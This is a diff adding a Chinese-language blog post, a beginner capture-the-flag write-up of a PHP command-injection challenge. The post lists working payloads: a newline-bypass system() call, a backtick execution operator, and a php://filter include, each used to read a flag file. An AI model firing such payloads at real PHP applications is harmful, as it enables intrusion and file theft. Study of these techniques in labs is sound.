@@ -277,6 +277,66 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-basic-rce1" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2020/11/23/basic-rce1/" class="article-date">
+      <time datetime="2020-11-23T09:27:50.000Z" itemprop="datePublished">2020-11-23</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2020/11/23/basic-rce1/">Baba童鞋的web第一天记录</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>  今天，写了web小分队里发的一道web基础题，它是关于php简单绕过的。<br>  具体wp如下<br>  首先打开网址，会看到以下内容<br>  <img src="/2020/11/23/basic-rce1/web1.png"><br>  根据内容，可以看出是一道php换行符绕过题（%0a），我们输入以下payload<br>  【GET】 /?a=system(%27%0acat%20f*%20|%20base64%27)；<br>  <img src="/2020/11/23/basic-rce1/web2.png"><br>  成功绕过！<br>  根据内容可以看出时base64编码，在百度上搜索base64在线解码器，进行在线解码<br>  <img src="/2020/11/23/basic-rce1/web3.png"><br>  dingdong!成功得到flag~<br>  注：<br>  exp1：php执行运算符<br>  GET /?a=echo <code>base64 flag.php</code></p>
+<p>  exp2：换行符绕过（%0a）<br>  GET /?a=system(%27%0acat%20f*%20|%20base64%27);</p>
+<p>  exp3：利用include函数加php伪协议<br>  GET /a=include%20%27php://filter/convert.base64-encode/resource=./flag.php%27;<br>  （baba童鞋还是可以正经滴）</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
     <article id="post-leetcode" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
